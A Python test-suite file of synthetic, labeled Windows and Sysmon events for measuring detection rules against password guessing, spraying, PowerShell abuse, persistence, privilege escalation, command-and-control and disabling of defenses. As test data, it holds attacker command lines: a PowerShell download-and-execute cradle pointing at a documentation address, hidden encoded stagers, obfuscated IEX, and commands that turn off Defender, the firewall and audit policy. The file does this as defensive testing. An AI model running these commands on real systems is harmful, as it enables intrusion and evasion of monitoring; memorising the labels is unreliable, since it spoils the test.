"""The labeled detection test suite.

Each case is a small, isolated set of raw events plus a label: the set of
rules whose *target behavior* is really present. Labels describe reality,
not what the rules currently do. Several cases are known misses or known
false alarms, deliberately included so the metrics show where the rules
fail instead of a flattering 100%.

Categories (spec: positives, benign, edge cases, incomplete telemetry,
malformed events, lookalikes):

* positive: the behavior is present and in scope for the rule;
* benign: ordinary activity;
* lookalike: resembles an attack but is legitimate;
* edge: thresholds, boundaries, unusual-but-valid input;
* incomplete: a field the rule relies on is missing;
* gap: the behavior is present but outside what the rule can see;
* malformed: records the normalizer must reject without crashing.

All data is synthetic; addresses are private or RFC 5737 documentation ranges.
"""

import hashlib
import json
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from typing import Any, Literal

Category = Literal["positive", "benign", "lookalike", "edge", "incomplete", "gap", "malformed"]
CATEGORIES: tuple[Category, ...] = (
    "positive", "benign", "lookalike", "edge", "incomplete", "gap", "malformed",
)  # fmt: skip

T0 = datetime(2026, 8, 3, 9, 0, tzinfo=UTC)
B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
OFFICE = r"C:\Program Files\Microsoft Office\root\Office16"


@dataclass(frozen=True)
class Case:
    id: str
    title: str
    category: Category
    description: str
    expected: frozenset[str]  # rules whose target behavior is present
    records: tuple[dict[str, Any], ...]
    expected_rejected: int = 0  # malformed records the normalizer must reject
    notes: str = field(default="")


def _ev(seconds: float, event_type: str, **fields: Any) -> dict[str, Any]:
    record = {
        "timestamp": (T0 + timedelta(seconds=seconds)).isoformat().replace("+00:00", "Z"),
        "event_source": fields.pop("event_source", "windows-security"),
        "event_type": event_type,
        **fields,
    }
    return record


def _fail(seconds: float, user: str | None, ip: str | None, **extra: Any) -> dict[str, Any]:
    fields = {k: v for k, v in (("username", user), ("source_ip", ip)) if v is not None}
    return _ev(seconds, "authentication_failure", windows_event_id=4625, hostname="dc-01",
               **fields, **extra)  # fmt: skip


def _ok(seconds: float, user: str, ip: str) -> dict[str, Any]:
    return _ev(seconds, "authentication_success", windows_event_id=4624, hostname="dc-01",
               username=user, source_ip=ip)  # fmt: skip


def _proc(
    command: str,
    image: str = "powershell.exe",
    parent: str = "explorer.exe",
    seconds: float = 0,
    **extra: Any,
) -> dict[str, Any]:
    return _ev(seconds, "process_creation", event_source="sysmon", hostname="ws-01",
               username="alice", Image=image, ParentImage=parent, CommandLine=command, **extra)  # fmt: skip


def _conn(image: str, ip: str, port: int, seconds: float = 0) -> dict[str, Any]:
    return _ev(seconds, "network_connection", event_source="sysmon", hostname="ws-01",
               username="alice", Image=image, DestinationIp=ip, DestinationPort=port)  # fmt: skip


def _case(
    id: str,
    title: str,
    category: Category,
    expected: set[str],
    records: list[dict[str, Any]],
    description: str,
    rejected: int = 0,
) -> Case:
    return Case(id, title, category, description, frozenset(expected), tuple(records), rejected)  # fmt: skip


AUTH1, AUTH2, EXEC, PRIV = "AEGIS-AUTH-001", "AEGIS-AUTH-002", "AEGIS-EXEC-001", "AEGIS-PRIV-001"
PROC, PERS, NET, DEF = "AEGIS-PROC-001", "AEGIS-PERS-001", "AEGIS-NET-001", "AEGIS-DEF-001"

CASES: tuple[Case, ...] = (
    # --- AEGIS-AUTH-001: password guessing ------------------------------------
    _case("auth-burst", "Burst of failures for one account", "positive", {AUTH1},
          [_fail(i * 15, "bob", "203.0.113.7") for i in range(8)],
          "Eight failed logons for one account within two minutes."),
    _case("auth-burst-success", "Failures followed by a success", "positive", {AUTH1},
          [*(_fail(i * 10, "carol", "198.51.100.9") for i in range(6)), _ok(70, "carol", "198.51.100.9")],
          "Guessing that succeeds."),
    _case("auth-threshold-boundary", "Exactly five failures in five minutes", "edge", {AUTH1},
          [_fail(i * 75, "dave", "203.0.113.8") for i in range(5)],
          "Five failures spanning exactly 300 seconds: the documented threshold."),
    _case("auth-slow-guessing", "Slow guessing below the window", "gap", {AUTH1},
          [_fail(i * 240, "erin", "203.0.113.11") for i in range(10)],
          "Ten guesses, four minutes apart. Real guessing, but never five in one window."),
    _case("auth-no-username", "Failures without a username field", "incomplete", {AUTH1},
          [_fail(i * 10, None, "203.0.113.12") for i in range(8)],
          "The log source omits the account name; the default grouping needs it."),
    _case("auth-typos", "A user mistypes twice", "benign", set(),
          [_fail(0, "frank", "10.10.1.30"), _fail(20, "frank", "10.10.1.30"), _ok(40, "frank", "10.10.1.30")],
          "Two typos, then a successful logon."),
    _case("auth-stale-service-password", "Service retrying an old password", "lookalike", set(),
          [_fail(i * 20, "svc_reports", "10.10.0.50") for i in range(6)],
          "A reporting service still uses a changed password. A misconfiguration, not guessing."),
    _case("auth-single-account-many-failures", "Many failures for one account only", "positive", {AUTH1},
          [_fail(i * 5, "grace", "203.0.113.13") for i in range(7)],
          "One account, one source: guessing (AUTH-001), not spraying (AUTH-002)."),

    # --- AEGIS-AUTH-002: password spraying -------------------------------------
    _case("spray-external", "One source, many accounts", "positive", {AUTH2},
          [_fail(i * 20, f"user{i}", "198.51.100.23") for i in range(7)],
          "Seven accounts, one attempt each, from one external address."),
    _case("spray-distributed", "Spraying from many sources", "gap", {AUTH2},
          [_fail(i * 20, f"user{i}", f"203.0.113.{40 + i}") for i in range(6)],
          "One attempt per account, each from a different address."),
    _case("spray-nat-monday", "Users behind NAT after a password expiry", "lookalike", set(),
          [_fail(i * 60, f"staff{i}", "10.10.99.1") for i in range(5)],
          "Five employees behind the office NAT mistype expired passwords."),

    # --- AEGIS-EXEC-001: suspicious PowerShell ---------------------------------
    _case("ps-encoded-hidden", "Hidden, encoded PowerShell", "positive", {EXEC},
          [_proc(f"powershell.exe -nop -w hidden -enc {B64}", parent="cmd.exe")],
          "Classic stager options."),
    _case("ps-download-cradle", "Download and execute", "positive", {EXEC},
          [_proc("powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')\"")],
          "Downloads a script and runs it in memory."),
    _case("ps-concat-obfuscation", "IEX hidden by string concatenation", "gap", {EXEC},
          [_proc("powershell.exe -c \"& ('I'+'EX') (gc C:\\Users\\Public\\a.txt)\"")],
          "Invoke-Expression built from pieces; no indicator matches."),
    _case("ps-sccm-encoded", "Configuration Manager deployment script", "lookalike", set(),
          [_proc(f"powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {B64}",
                 parent=r"C:\Windows\CCM\CcmExec.exe")],
          "Management agents legitimately use -EncodedCommand and Bypass."),
    _case("ps-admin-script", "Signed admin script", "benign", set(),
          [_proc("powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File C:\\Scripts\\report.ps1")],
          "RemoteSigned is the default policy, not a bypass."),
    _case("ps-plain", "Interactive PowerShell", "benign", set(),
          [_proc("powershell.exe -c Get-Service")], "Ordinary command."),
    _case("ps-no-command-line", "Encoded execution, command line not logged", "incomplete", {EXEC},
          [_ev(0, "process_creation", event_source="edr", hostname="ws-01", username="alice",
               process_name="powershell.exe", parent_process_name="cmd.exe", note="cmdline truncated")],
          "The EDR dropped the command line of a malicious encoded execution."),

    # --- AEGIS-PRIV-001: privileged group changes ------------------------------
    _case("priv-admin-group-event", "Account added to Administrators", "positive", {PRIV},
          [_ev(0, "group_membership_change", windows_event_id=4732, hostname="srv-01",
               username="mallory", group_name="Administrators", member_name="mallory")],
          "Unauthorized self-promotion."),
    _case("priv-net-add", "net localgroup … /add", "positive", {PRIV},
          [_proc("net localgroup administrators helpdesk /add", image="net.exe", parent="cmd.exe")],
          "Adds an account to the local administrators from the command line."),
    _case("priv-authorized-change", "Approved change with a ticket", "lookalike", set(),
          [_ev(0, "group_membership_change", windows_event_id=4732, hostname="srv-01",
               username="it.admin", group_name="Backup Operators", member_name="oliver",
               change_ticket="CHG-2001")],
          "Planned administration. The rule cannot read change tickets."),
    _case("priv-localized-name", "German-language Administrators group", "gap", {PRIV},
          [_ev(0, "group_membership_change", windows_event_id=4732, hostname="srv-de-01",
               username="mallory", group_name="Administratoren", member_name="mallory")],
          "Same attack on a localized system; the group name differs."),
    _case("priv-list-admins", "Listing administrators", "benign", set(),
          [_proc("net localgroup administrators", image="net.exe", parent="cmd.exe")],
          "Reading group membership changes nothing."),
    _case("priv-ordinary-group", "Added to a project group", "benign", set(),
          [_ev(0, "group_membership_change", windows_event_id=4732, hostname="dc-01",
               username="it.admin", group_name="Project-X", member_name="oliver")],
          "Not a privileged group."),

    # --- AEGIS-PROC-001: process relationships ---------------------------------
    _case("proc-word-shell", "Word starts a shell", "positive", {PROC},
          [_proc("cmd.exe /c whoami", image="cmd.exe", parent=rf"{OFFICE}\WINWORD.EXE")],
          "Macro execution."),
    _case("proc-webshell", "IIS worker starts cmd", "positive", {PROC},
          [_proc("cmd.exe /c dir C:\\inetpub", image="cmd.exe", parent=r"c:\windows\system32\inetsrv\w3wp.exe")],
          "Web shell command execution."),
    _case("proc-masquerade", "svchost.exe in a user folder", "positive", {PROC},
          [_proc("svchost.exe -k netsvcs", image=r"C:\Users\Public\svchost.exe")],
          "System binary name outside System32."),
    _case("proc-finance-macro", "Recurring finance macro", "lookalike", set(),
          [_proc(r"cmd.exe /c copy \\file-01\finance\t.xlsx C:\Users\alice\ /Y", image="cmd.exe",
                 parent=rf"{OFFICE}\EXCEL.EXE")],
          "A known workbook copies a template every morning."),
    _case("proc-wmi-indirection", "Macro spawns PowerShell via WMI", "gap", {PROC},
          [_proc("powershell.exe -c Get-ChildItem C:\\Users", parent=r"C:\Windows\System32\wbem\wmiprvse.exe")],
          "The macro used WMI, so PowerShell's parent is wmiprvse, not Word."),
    _case("proc-masquerade-no-path", "Masquerading binary, path not logged", "incomplete", {PROC},
          [_ev(0, "process_creation", event_source="edr", hostname="ws-01", username="alice",
               process_name="svchost.exe", parent_process_name="explorer.exe",
               process_command_line="svchost.exe -k netsvcs")],
          "The source records only the image name, not the folder it ran from."),
    _case("proc-normal-office", "Explorer opens Word", "benign", set(),
          [_proc("WINWORD.EXE /n report.docx", image=rf"{OFFICE}\WINWORD.EXE", parent=r"C:\Windows\explorer.exe")],
          "Normal use."),

    # --- AEGIS-PERS-001: persistence -------------------------------------------
    _case("pers-task", "Scheduled task created", "positive", {PERS},
          [_ev(0, "scheduled_task_created", windows_event_id=4698, hostname="ws-01",
               username="alice", task_name="\\Updater")],
          "Unknown task created by a user."),
    _case("pers-run-key", "Run key added", "positive", {PERS},
          [_ev(0, "registry_modification", event_source="sysmon", windows_event_id=13, hostname="ws-01",
               username="alice", operation="SetValue",
               registry_key=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater")],
          "Autostart value set."),
    _case("pers-sc-create", "Service created from the command line", "positive", {PERS},
          [_proc(r"sc.exe create Updater binPath= C:\Users\Public\u.exe", image="sc.exe", parent="cmd.exe")],
          "New service pointing at a user-writable folder."),
    _case("pers-run-key-removed", "Run key value deleted", "edge", set(),
          [_ev(0, "registry_modification", event_source="sysmon", windows_event_id=12, hostname="ws-01",
               username="alice", operation="DeleteValue",
               registry_key=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OldTool")],
          "Removing an autostart entry is the opposite of persistence."),
    _case("pers-software-update-service", "Browser updater installs its service", "lookalike", set(),
          [_ev(0, "service_installed", event_source="windows-system", windows_event_id=7045,
               hostname="ws-01", username="SYSTEM", service_name="BrowserUpdateService",
               service_file_name=r"C:\Program Files\Browser\update.exe")],
          "Signed vendor software from Program Files."),
    _case("pers-startup-folder", "Script dropped in the Startup folder", "gap", {PERS},
          [_ev(0, "file_created", event_source="sysmon", windows_event_id=11, hostname="ws-01",
               username="alice",
               target_filename=r"C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\u.vbs")],
          "Startup-folder persistence is outside the rule's scope."),
    _case("pers-query-tasks", "Listing scheduled tasks", "benign", set(),
          [_proc("schtasks /query /fo LIST", image="schtasks.exe", parent="cmd.exe")],
          "Read-only."),

    # --- AEGIS-NET-001: outbound connections -----------------------------------
    _case("net-beacon-nonstandard", "rundll32 beacon to port 4444", "positive", {NET},
          [_conn("rundll32.exe", "198.51.100.66", 4444, s) for s in (0, 60, 120)],
          "Command and control on a non-standard port."),
    _case("net-stager-https", "PowerShell stager over HTTPS", "positive", {NET},
          [_conn("powershell.exe", "203.0.113.50", 443)],
          "Script host fetching a payload."),
    _case("net-c2-over-443", "Unknown binary beaconing over 443", "gap", {NET},
          [_conn("updater.exe", "203.0.113.90", 443, s) for s in (0, 60, 120)],
          "C2 that blends in: normal port, not a script host."),
    _case("net-admin-module-update", "Admin updates PowerShell modules", "lookalike", set(),
          [_conn("powershell.exe", "203.0.113.30", 443)],
          "Install-Module from the public gallery."),
    _case("net-browser", "Browser on HTTPS", "benign", set(),
          [_conn("msedge.exe", "203.0.113.10", 443)], "Normal browsing."),
    _case("net-internal-smb", "PowerShell to the internal file server", "benign", set(),
          [_conn("powershell.exe", "10.10.0.30", 445)], "Internal traffic is out of scope."),

    # --- AEGIS-DEF-001: weakened defenses --------------------------------------
    _case("def-defender-off", "Defender real-time protection disabled", "positive", {DEF},
          [_proc("Set-MpPreference -DisableRealtimeMonitoring $true")], "Turns off AV."),
    _case("def-log-cleared", "Security log cleared", "positive", {DEF},
          [_ev(0, "log_cleared", windows_event_id=1102, hostname="srv-01", username="mallory",
               log_name="Security")], "Anti-forensics."),
    _case("def-firewall-off", "Firewall turned off", "positive", {DEF},
          [_proc("netsh advfirewall set allprofiles state off", image="netsh.exe", parent="cmd.exe")],
          "Disables the host firewall."),
    _case("def-auditpol-clear", "Audit policy cleared with auditpol", "gap", {DEF},
          [_proc("auditpol.exe /clear /y", image="auditpol.exe", parent="cmd.exe")],
          "Impairs logging, but this command form is not covered."),
    _case("def-upgrade-restart", "Defender briefly off during an upgrade", "lookalike", set(),
          [_ev(0, "security_config_change", event_source="defender", hostname="ws-01",
               username="SYSTEM", control="defender_realtime_protection", new_state="disabled",
               reason="platform update"),
           _ev(90, "security_config_change", event_source="defender", hostname="ws-01",
               username="SYSTEM", control="defender_realtime_protection", new_state="enabled",
               reason="platform update")],
          "The product disables itself for 90 seconds while updating."),
    _case("def-firewall-on", "Firewall turned on", "benign", set(),
          [_ev(0, "security_config_change", event_source="windows-firewall", hostname="ws-01",
               username="it.admin", control="windows_firewall", new_state="enabled")],
          "Hardening, not weakening."),

    # --- Malformed input ---------------------------------------------------------
    _case("malformed-records", "Invalid records", "malformed", set(),
          [{"timestamp": "yesterday", "event_source": "x", "event_type": "authentication_failure"},
           {"timestamp": "2026-08-03T09:00:00Z", "event_source": "x", "event_type": "network_connection",
            "destination_ip": "999.1.1.1"},
           {"timestamp": "2026-08-03T09:00:00Z", "event_source": "x"},
           {"timestamp": "2026-08-03T09:00:00Z", "event_source": "x", "event_type": "logon",
            "severity": "apocalyptic"}],
          "Every record must be rejected by the normalizer; no rule may see them.", rejected=4),
)  # fmt: skip


def case_by_id() -> dict[str, Case]:
    return {case.id: case for case in CASES}


def dataset_version() -> str:
    """Content hash of the suite: same hash + same rule versions/params = same results."""
    material = json.dumps(
        [
            {"id": c.id, "expected": sorted(c.expected), "records": list(c.records),
             "rejected": c.expected_rejected}
            for c in CASES
        ],
        sort_keys=True,
    )  # fmt: skip
    return "sha256:" + hashlib.sha256(material.encode("utf-8")).hexdigest()[:16]


SUITE_ID = "aegis-detection-suite"
SUITE_NAME = "AEGIS detection test suite"
